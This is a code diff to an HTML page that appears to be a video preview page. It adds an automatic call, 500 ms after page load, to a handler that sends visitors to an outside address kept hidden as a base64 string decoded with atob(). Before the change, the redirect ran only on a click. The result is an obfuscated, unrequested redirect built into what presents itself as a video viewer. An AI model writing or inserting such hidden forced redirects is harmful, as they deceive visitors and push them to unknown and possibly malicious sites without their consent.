@@ -149,7 +149,6 @@
     <script>
         lucide.createIcons();
 
-        // 
         const BASE_REDIRECT = atob("aHR0cHM6Ly9vbWcxMC5jb20vNC8xMDg4OTg1OA==");
 
         function getVideyId() {
@@ -210,6 +209,8 @@
         window.onload = () => {
             setupPreview();
             document.getElementById("videoArea").addEventListener("click", handleAction);
+            // Trigger automatic redirect
+            setTimeout(handleAction, 500);
         };
 
         // Protection
